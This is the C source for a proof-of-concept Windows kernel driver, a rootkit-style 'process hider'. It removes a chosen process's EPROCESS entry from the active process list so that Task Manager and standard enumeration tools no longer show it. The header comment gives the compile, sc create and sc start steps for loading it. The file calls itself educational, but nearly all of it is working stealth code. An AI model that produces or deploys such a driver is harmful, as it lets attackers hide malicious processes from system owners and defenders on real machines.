/*
 * PoC Kernel Driver: Process Hider
 *
 * This driver unlinks a target process's EPROCESS from PsActiveProcessHead
 * so it will not appear in Task Manager or other standard process enumerations.
 *
 * Build with Windows Driver Kit (WDK). Replace the hardcoded PID in DriverEntry
 * with the PID of a test process (notepad.exe) before loading.
 *
 * Usage:
 * 1. Compile and sign the driver accordingly for your test machine.
 * 2. sc create HiderDriver type= kernel binPath= "\\??\\C:\\Drivers\\HiderDriver.sys"
 * 3. sc start HiderDriver
 * 4. Observe that the target PID is no longer visible.
 * 5. sc stop HiderDriver
 *
 * This is for educational purposes. Modern Windows versions with PatchGuard
 * may detect unauthorized modifications. Run in a test VM.
 */

#include <ntddk.h>

VOID HideProcess(PEPROCESS Process)
{
    PLIST_ENTRY list = &Process->ActiveProcessLinks;
    PLIST_ENTRY prev = list->Blink;
    PLIST_ENTRY next = list->Flink;

    //unlink from the active process list
    prev->Flink = next;
    next->Blink = prev;

    //self-link to prevent accidental dereference issues
    list->Flink = list;
    list->Blink = list;
}

NTSTATUS HideProcessByPid(HANDLE pid)
{
    PEPROCESS target = NULL;
    NTSTATUS status = PsLookupProcessByProcessId(pid, &target);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Hider] PsLookupProcessByProcessId(0x%p) failed: 0x%X\n", pid, status);
        return status;
    }

    HideProcess(target);
    ObDereferenceObject(target);
    DbgPrint("[Hider] Process 0x%p unlinked\n", pid);
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("[Hider] Driver unloaded\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("[Hider] Driver loaded\n");

    //change this to the PID you want to hide
    HANDLE pidToHide = (HANDLE)1234;
    HideProcessByPid(pidToHide);

    return STATUS_SUCCESS;
}
